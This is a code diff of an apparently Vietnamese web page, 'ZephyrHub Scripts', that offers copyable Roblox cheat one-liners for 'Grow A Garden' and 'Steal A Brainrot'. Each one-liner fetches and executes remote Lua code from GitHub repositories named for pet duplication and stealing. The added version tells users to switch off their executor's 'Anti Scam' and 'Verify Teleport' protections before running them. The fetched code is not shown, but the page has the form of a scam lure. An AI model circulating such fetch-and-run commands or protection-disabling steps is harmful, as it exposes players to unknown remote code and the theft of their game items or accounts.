@@ -1,1 +1,36 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Scripts</title></head><body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center"><h2 style="color:#3b82f6">ZephyrHub</h2><p>Grow A Garden</p><input id="s1" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/NoLag-DupePet/refs/heads/main/Main.lua"))()' readonly style="width:90%"><button onclick="n('s1')">Copy</button><p>Steal A Brainrot</p><input id="s2" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/FarmEvent-StealPet/refs/heads/main/Steal%20A%20Brainrot"))()' readonly style="width:90%"><button onclick="n('s2')">Copy</button><script>function n(i){navigator.clipboard.writeText(document.getElementById(i).value).then(()=>alert("Đã copy"))}</script></body></html>
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>ZephyrHub Scripts</title>
+</head>
+<body style="background-color:#0f172a; color:white; font-family:sans-serif; text-align:center; padding:30px;">
+  <h1 style="color:#3b82f6;">ZephyrHub</h1>
+
+  <h2>🌱 Script Grow A Garden</h2>
+  <input id="script1" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/NoLag-DupePet/refs/heads/main/Main.lua"))()' size="100" readonly>
+  <button onclick="copy('script1')">📋 Copy</button>
+
+  <h2>🧠 Script Steal A Brainrot</h2>
+  <input id="script2" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/FarmEvent-StealPet/refs/heads/main/Steal%20A%20Brainrot"))()' size="100" readonly>
+  <button onclick="copy('script2')">📋 Copy</button>
+
+  <h3>📘 Hướng dẫn (cho Delta)</h3>
+  <ul style="text-align:left; display:inline-block;">
+    <li>Bước 1: Mở Delta</li>
+    <li>Bước 2: Vào Setting (bánh răng)</li>
+    <li>Bước 3: Tắt Anti Scam</li>
+    <li>Bước 4: Tắt Verify Teleport</li>
+  </ul>
+
+  <script>
+    function copy(id) {
+      const input = document.getElementById(id);
+      input.select();
+      input.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+      alert("Đã copy script!");
+    }
+  </script>
+</body>
+</html>
